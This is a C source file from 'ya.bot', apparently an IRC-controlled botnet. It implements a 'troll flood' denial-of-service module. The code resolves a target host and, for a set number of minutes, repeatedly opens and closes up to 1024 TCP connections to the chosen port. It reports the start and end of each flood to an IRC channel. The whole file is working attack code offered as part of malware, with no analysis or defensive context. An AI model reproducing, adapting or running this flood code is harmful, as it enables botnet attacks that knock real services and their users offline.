/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_TROLLFLOOD
DWORD WINAPI trollflood_main(LPVOID param)
{
	DWORD dwTime;
	int i;
	sockaddr_in sin;
	SOCKET sock[1024];
	STrollFlood s_tf = *((STrollFlood *)param);

#ifndef NO_DEBUG
		debug_print("Troll flooding, trollflood_main()");
#endif

	if (!gethostbyname(s_tf.m_szHost))
	{
		if ((!s_tf.m_bSilent) && (s_tf.m_bVerbose))
				irc_message(s_tf.m_bsock, s_tf.m_szAction, s_tf.m_szDestination,
						(char *)string_ddosfailed,
						CRED, string_replyddos, CEND, string_replydotbot);
			thread_remove(THREAD_DDOS);
			return 0;
	}
		sin.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)s_tf.m_szHost)->h_addr_list[0];
		sin.sin_family = AF_INET;
		sin.sin_port = htons(s_tf.m_nPort);
	if (s_tf.m_nSockets > 1024)
			s_tf.m_nSockets = 1024;
	if (!s_tf.m_bSilent)
			irc_message(s_tf.m_bsock, s_tf.m_szAction, s_tf.m_szDestination,
					(char *)string_ddostrollfloodstarted,
					CGREEN, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_tf.m_szHost,
					CBLUE, CEND, s_tf.m_nPort,
					CBLUE, CEND, s_tf.m_nSockets,
					CBLUE, CEND, s_tf.m_nDelay,
					CBLUE, CEND, s_tf.m_dwTime);
		dwTime = GetTickCount();
	while (TRUE)
	{
		for (i = 0; i < s_tf.m_nSockets; i++)
		{
				closesocket(sock[i]);
				sock[i] = socket(AF_INET, SOCK_STREAM, 0);
				connect(sock[i], (sockaddr *)&sin, sizeof(sin));
		}
			Sleep(s_tf.m_nDelay);
		if ((GetTickCount() - dwTime) >= (s_tf.m_dwTime * 60000))
				break;
	}
	if ((!s_tf.m_bSilent) && (s_tf.m_bVerbose))
			irc_message(s_tf.m_bsock, s_tf.m_szAction, s_tf.m_szDestination,
					(char *)string_ddosfinishedflooding,
					CBLUE, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_tf.m_szHost,
					CBLUE, CEND, s_tf.m_dwTime);
		thread_remove(THREAD_DDOS);
		return 0;
}
#endif